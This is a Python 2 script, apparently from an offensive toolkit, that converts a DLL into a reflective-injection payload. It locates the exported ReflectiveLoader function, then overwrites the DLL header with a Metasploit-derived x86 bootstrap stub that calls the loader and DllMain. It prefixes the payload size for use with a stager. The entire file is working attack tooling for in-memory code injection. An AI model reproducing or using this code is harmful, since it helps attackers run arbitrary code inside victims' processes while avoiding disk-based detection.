#! /usr/bin/env python
# -*- coding: utf-8 -*-

"""
author: mosin <hucmoxing@163.com>
desc:This file is reflectPatcher Files.
main function is reflective_patcher(dll,path_dllname)
dll:dll Path
path_dllname:path Dll result name
Date:2018-08-01
"""

import sys, pefile, struct


class bcolors:
    FAIL = '\033[91m'
    BOLD = '\033[1m'
    GREEN = '\033[32m'
    ENDC = '\033[0m'

#获取文件偏移地址
def get_file_offset(pe):
  rva =''
  #找到PE导出函数，也就是dll文件的EXPLOIT地址
  if hasattr(pe, 'DIRECTORY_ENTRY_EXPORT'):
    #找loader地址
    for export in pe.DIRECTORY_ENTRY_EXPORT.symbols:
      if "ReflectiveLoader" in export.name:
        #指向导出地址赋值
        rva = export.address
        break;

  if not rva:
    sys.exit(1)
    
  #得到虚函数地址长度
  offset_va = rva - pe.get_section_by_rva(rva).VirtualAddress
  #得到基地址长度
  offset_file = offset_va + pe.get_section_by_rva(rva).PointerToRawData

  # Correct 7 bytes
  offset_file -= 7

  # Return little endian version
  return struct.pack("<I", offset_file).encode('hex')

#对stub头进行修复
#https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/payload/windows/reflectivedllinject.rb
def patch_stub(offset_file, exit_addr):
  stub = ("\x4D"                                    # dec ebp             ; M
          "\x5A"                                    # pop edx             ; Z
          "\xE8\x00\x00\x00\x00"                    # call 0              ; call nexmsn ls t instruction
          "\x5B"                                    # pop ebx             ; get our location (+7)
          "\x52"                                    # push edx            ; push edx back
          "\x45"                                    # inc ebp             ; restore ebp
          "\x55"                                    # push ebp            ; save ebp
          "\x89\xE5"                                # mov ebp, esp        ; setup fresh stack frame
          "\x81\xC3" + offset_file.decode('hex')  + # add ebx, 0x???????? ; add offset to ReflectiveLoader
          "\xFF\xD3"                                # call ebx            ; call ReflectiveLoader
          "\x89\xC3"                                # mov ebx, eax        ; save DllMain for second call
          "\x57"                                    # push edi            ; our socket
          "\x68\x04\x00\x00\x00"                    # push 0x4            ; signal we have attached
          "\x50"                                    # push eax            ; some value for hinstance
          "\xFF\xD0"                                # call eax            ; call DllMain( somevalue, DLL_METASPLOIT_ATTACH, socket )
          "\x68" + exit_addr +                      # push 0x????????     ; our EXITFUNC placeholder
          "\x68\x05\x00\x00\x00"                    # push 0x5            ; signal we have detached
          "\x50"                                    # push eax            ; some value for hinstance
          "\xFF\xD3")                               # call ebx            ; call DllMain( somevalue, DLL_METASPLOIT_DETACH, exitfunk )
  return stub

#Return Path Dll
def reflective_patcher(dll):
  #退出DLLMain函数地址,默认为退出当前线索迁移
  exit_method = {'thread': '\xE0\x1D\x2A\x0A', 'seh': '\xFE\x0E\x32\xEA', 'process':'\xF0\xB5\xA2\x56'}
  exit_addr = exit_method["process"]

  '''
  if exit_func not in exit_method:
    print bcolors.GREEN + "[!] Not valid exit method: [thread|seh|process]" + bcolors.ENDC
    sys.exit(1)
  '''

  try:
    #dll为dll的绝对路径
    pe =  pefile.PE(dll)
  except IOError as e:
    print str(e)
    sys.exit(1)
    
  #获取PE结构中导出函数地址偏移
  offset_file = get_file_offset(pe)
  #重定位地址，等待加载内存
  stub = patch_stub(offset_file,exit_addr)

  #读取dll文件，此dll文件为外部加载的dll文件
  src = file(dll,'rb')
  payload = src.read()

  # Relfective = Size payload + stub + (payload - stub)
  reflective_payload = struct.pack("<I",len(payload))  + stub + payload[len(stub):]
  #print bcolors.GREEN + "[*] Size (4 bytes) prefixed at the beginning of the payload. Cut it off if you are using a HTTP stager!" + bcolors.ENDC

  patched_dll = 'lib/soure/temp/reflective_path.dll'
  dst = open(patched_dll,'wb')
  dst.write(reflective_payload)

  src.close()
  dst.close()
  #print bcolors.BOLD + "[+] Patched! %s (%d bytes)." % (patched_dll,len(reflective_payload)) + bcolors.ENDC

